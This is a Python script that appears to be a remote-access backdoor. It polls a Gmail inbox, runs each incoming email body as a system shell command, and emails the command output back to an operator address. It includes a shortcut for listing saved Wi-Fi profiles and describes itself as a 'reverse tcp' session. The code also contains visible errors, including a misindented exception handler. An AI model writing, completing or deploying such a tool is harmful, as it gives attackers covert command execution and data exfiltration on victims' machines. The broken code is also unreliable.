import imaplib
import email
from email.header import decode_header
import os
import smtplib 
import subprocess
import time
# account credentials for python to send mail and recieve mail
username = "youraccount@gmail.com"
password = "************"

# your account to view the mail sent from python
your_mail = 'yourmail@gmail.com'

def clean(text):
    # clean text for creating a folder
    return "".join(c if c.isalnum() else "_" for c in text)
def shell():   
    try:
        imap = imaplib.IMAP4_SSL("imap.gmail.com")
        # authenticate
        imap.login(username, password)

        status, messages = imap.select("INBOX")
        # number of top emails to fetch
        N = 1
        # total number of emails
        messages = int(messages[0])

        for i in range(messages, messages-N, -1):
        # fetch the email message by ID
            res, msg = imap.fetch(str(i), "(RFC822)")
            for response in msg:
                if isinstance(response, tuple):
                    # parse a bytes email into a message object
                    msg = email.message_from_bytes(response[1])
                    # decode the email subject
                    # decode email sender
                    From, encoding = decode_header(msg.get("From"))[0]
                    if isinstance(From, bytes):
                        From = From.decode(encoding)
                    print("From:", From)
                    # if the email message is multipart
                    if msg.is_multipart():
                        # iterate over email parts
                        for part in msg.walk():
                            # extract content type of email
                            content_type = part.get_content_type()
                            content_disposition = str(part.get("Content-Disposition"))
                            try:
                                # get the email body
                                body = part.get_payload(decode=True).decode()
                            except:
                                pass
                            if content_type == "text/plain" and "attachment" not in content_disposition:
                                # print text/plain emails and skip attachments
                                print(body)
                    else:
                        # extract content type of email
                        content_type = msg.get_content_type()
                        # get the email body
                        body = msg.get_payload(decode=True).decode()
                        if content_type == "text/plain":
                            # print only text email parts
                            print(body)
        while True:
            command = body
            if "send wifi names" in command:
                command = 'netsh wlan show profile'

            elif 'exit' in command:
                print('exitted sucessfully')
                sendmail('exiting please wait')
                exit()
                
            elif 'sleep' in command:
                px = command.replace('sleep','')
                zx = int(px)
                time.sleep(zx)
                print('sleeping for '+px+' seconds')
                break
            output = subprocess.getoutput(command)
            print(output)
            sendmail(output)
            break

        except Exception as e:
            print(e)
    

def sendmail(message):
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587) 
        s.starttls() 
        s.login(username, password) 
        s.sendmail(username,your_mail , message) 
        s.quit() 
    except Exception as e:
        print(e)
    



sendmail('hello reverse tcp started only waiting for 60 seconds please send cmd commands')
print('msg sent sucessfully')

while True:
    time.sleep(60)
    shell()
    

